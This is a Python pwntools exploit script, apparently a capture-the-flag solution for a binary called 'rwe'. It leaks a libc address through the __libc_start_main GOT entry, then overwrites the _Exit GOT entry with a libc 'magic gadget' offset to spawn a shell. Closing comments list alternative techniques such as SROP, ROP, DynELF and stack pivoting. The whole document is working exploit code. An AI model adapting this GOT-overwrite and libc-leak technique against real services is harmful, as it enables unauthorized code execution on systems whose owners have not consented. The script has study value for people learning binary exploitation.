#!/usr/bin/python -i

from pwn import *

DEBUG = True
execname = './rwe'
remoteip = '0.0.0.0'
port = 12346

context.arch = 'amd64'

env = {}

USE_MY_LIBC = True

if USE_MY_LIBC:
    libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
else:
    libc_path = os.getcwd() + '/libc.so.6'
    env['LD_PRELOAD'] = libc_path

libc = ELF(libc_path)

system_offset = libc.symbols['system']
__libc_start_main_offset = libc.symbols['__libc_start_main']
puts_offset = libc.symbols['puts']

if DEBUG:
    r = process(execname, env=env)
    gdb.attach(r)
    raw_input('continue gdb ->')
    context.log_level = 'DEBUG'
else:
    r = remote(remoteip, port)

__libc_start_main_gotentry = 0x601020
_Exit_gotentry = 0x601030

r.sendline(str(__libc_start_main_gotentry))

libc_base = int(r.recvline()[2:], 16) - __libc_start_main_offset

print 'libc base:', libc_base

r.sendline(str(_Exit_gotentry))

r.sendline(str(libc_base + 0x4526a))  # magic gadget

# Magic gadget is possible
# you can read out every possible address including vdso.
# you can also dynelf
# you can srop since you can access to syscall
# you can rop directly if you choose the stack layout carefully
# you can also bruteforce the syscall
# _Exit must have some syscall nearby?
# you can move the stack to another address to do rop
